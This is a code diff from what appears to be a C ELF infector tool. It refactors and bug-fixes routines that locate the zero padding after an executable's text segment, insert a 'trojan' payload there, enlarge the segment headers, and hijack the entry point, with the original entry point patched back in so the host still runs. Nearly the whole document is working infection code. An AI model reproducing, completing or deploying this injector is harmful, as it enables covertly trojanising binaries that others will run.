@@ -45,7 +45,7 @@ static bool _inf_check_padding(unsigned char *buf, size_t len) {
  * Find the magic address that will
  * be replaced by valid one
  */
-long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
+static long *_inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
 {
     uint8_t *ptr = trojan;
     for (int i=0 ; i < len ; ++i) {
@@ -56,6 +56,19 @@ long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
     }
     return NULL;
 }
+
+/** Locate and set injection offsets */
+static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data) {
+    inf->lsb.target_offset = text->p_offset + text->p_filesz;
+    /** If ELF is .so = ehdr->e_type */
+    inf->lsb.lsb_so_addr = inf->lsb.target_offset;
+    /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
+    inf->lsb.lsb_exec_addr = text->p_vaddr + text->p_filesz;
+
+    /** Total padding size (zeroes) between .text and .data */
+    return (data->p_offset - inf->lsb.lsb_so_addr);
+}
+
 
 infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
         long magic, struct mapped_file *map) {
@@ -100,25 +113,17 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     if (flags0 == (PF_R|PF_X) && flags1 == (PF_R|PF_W)) { /** .text,.data */
         text = inf->elfo->phdrs[idx0];
         data = inf->elfo->phdrs[idx1];
-    } else if (flags0 == (PF_R|PF_W) && flags1 == (PF_R|PF_R)) { /** .data,.text */
+    } else if (flags0 == (PF_R|PF_W) && flags1 == (PF_R|PF_X)) { /** .data,.text */
         text = inf->elfo->phdrs[idx1];
         data = inf->elfo->phdrs[idx0];
     }
 
-    if (!text || !data) {
+    if (!text) {
         log_error("Wait!? Unexpected loadable segment\n");
         return (elf_off_t)0;
     }
 
-    inf->pad.target_offset = text->p_offset + text->p_filesz;
-    /** If ELF is .so = ehdr->e_type */
-    inf->pad.lsb_so_addr = inf->pad.target_offset;
-    /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
-    inf->pad.lsb_exec_addr = text->p_vaddr + text->p_filesz;
-
-    /** Total padding size (zeroes) between .text and .data */
-    elf_off_t len = data->p_offset - inf->pad.lsb_so_addr;
-
+    elf_off_t len = _inf_set_pad(inf, text, data);
     if (len < inf->src_bin_size) {
         log_error("No available space for infection, not written\n");
         return false;
@@ -126,14 +131,14 @@ elf_off_t inf_scan_segment(infect_t *inf) {
 
     /** must be only zeroes :) */
     if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
-                inf->pad.target_offset, len) == true) {
+                inf->lsb.target_offset, len) == true) {
         /** Update to the new mem & file size */
         text->p_memsz = text->p_memsz + inf->src_bin_size;
         text->p_filesz = text->p_filesz + inf->src_bin_size;
         pass_check = true;
     } else {
         log_error("Error: Invalid padding - not all zeroes\n");
-        dump_buff_hex((unsigned char *)inf->elfo->mapaddr + inf->pad.target_offset, len);
+        dump_buff_hex((unsigned char *)inf->elfo->mapaddr + inf->lsb.target_offset, len);
         printf("\n");
     }
 
@@ -149,25 +154,25 @@ bool inf_load_and_patch(infect_t *inf) {
     elf_shdr_t **shdrs = inf->elfo->shdrs;
 
     /** Save original entry point and re-write new one to ehdr */
-    inf->pad.o_entry = ehdr->e_entry;
+    inf->lsb.o_entry = ehdr->e_entry;
     if (ehdr->e_type == ET_EXEC)
-        ehdr->e_entry = inf->pad.lsb_exec_addr;
+        ehdr->e_entry = inf->lsb.lsb_exec_addr;
     else if (ehdr->e_type == ET_DYN)
-        ehdr->e_entry = inf->pad.lsb_so_addr;
+        ehdr->e_entry = inf->lsb.lsb_so_addr;
 
     for (int i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
         elf_shdr_t *shdr = *shdrs;
         curr_sct_offset = shdr->sh_offset + shdr->sh_size;
 
-        if (inf->pad.target_offset == curr_sct_offset) {
+        if (inf->lsb.target_offset == curr_sct_offset) {
             shdr->sh_size = shdr->sh_size + inf->src_bin_size;
             break;
         }
     }
 
     /** All good! */
-    *(inf->magic_ptr) = inf->pad.o_entry;
-    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->pad.target_offset;
+    *(inf->magic_ptr) = inf->lsb.o_entry;
+    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->lsb.target_offset;
     memcpy(dest, inf->trojan, inf->src_bin_size);
 
     return true;
